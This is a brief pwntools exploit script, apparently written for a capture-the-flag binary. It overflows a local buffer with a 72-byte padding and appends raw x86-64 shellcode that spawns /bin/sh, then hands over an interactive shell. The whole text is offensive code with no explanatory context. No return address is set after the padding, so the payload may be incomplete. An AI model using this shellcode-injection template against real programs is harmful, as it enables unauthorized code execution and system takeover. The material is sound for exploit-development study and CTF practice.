from pwn import *

p = process('./classic_aa9e979fd5c597526ef30c003bffee474b314e22')

offset = 72
shellcode = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
payload = "A"*offset
# payload += '0x90'*4
payload += shellcode


p.recvuntil('Local Buffer >> ')
p.sendline(payload)
p.interactive()
